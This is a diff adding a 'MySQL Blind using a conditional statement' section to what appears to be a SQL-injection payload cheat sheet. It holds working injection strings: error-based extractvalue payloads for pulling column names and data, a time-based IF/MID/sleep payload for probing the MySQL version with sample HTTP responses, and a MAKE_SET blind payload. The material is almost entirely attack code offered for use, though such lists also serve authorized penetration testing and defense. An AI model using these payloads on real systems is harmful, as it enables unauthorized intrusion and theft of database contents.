@@ -48,6 +48,21 @@ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(12
 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
 ```
 
+## MYSQL Blind using a conditional statement
+TRUE: `if @@version starts with a 5`:
+```
+2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+Response:
+HTTP/1.1 500 Internal Server Error
+```
+
+False: `if @@version starts with a 4`:
+```
+2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
+Response:
+HTTP/1.1 200 OK
+```
+
 ## MYSQL Blind with MAKE_SET
 ```
 AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
